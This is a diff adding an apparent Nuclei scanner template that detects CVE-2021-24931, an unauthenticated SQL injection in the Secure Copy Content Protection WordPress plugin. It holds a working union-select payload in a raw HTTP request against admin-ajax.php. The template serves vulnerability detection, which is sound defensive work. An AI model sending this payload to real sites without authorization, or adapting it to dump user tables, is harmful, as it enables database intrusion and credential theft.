@@ -1,0 +1,30 @@
+id: wordpress-plugin-securecopycontentprotection-sqli
+info:
+  name: WordPress SecureCopyContentProtection SQL Injection (CVE-2021-24931)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Secure Copy Content Protection is a WordPress plugin designed to prevent content theft by disabling right-click, copy-paste, and other methods. The plugin has an SQL injection vulnerability in the `ays_sccp_results_export_file` action's `sccp_id` parameter.
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2021-24931
+  tags: sqli,wordpress,plugin
+  reference:
+    - https://downloads.wordpress.org/plugin/secure-copy-content-protection.3.0.4.zip
+    - https://fofa.info/
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20union%20select%201,md5(1423),2,2,2,2%20from%20wp_users%20union%20select%201,1,1,1,1,1%20FROM%20wp_ays_sccp_reports%20WHERE%20(1=1%20&type=json HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "856fc81623da2150ba2210ba1b51d241"
+        part: body
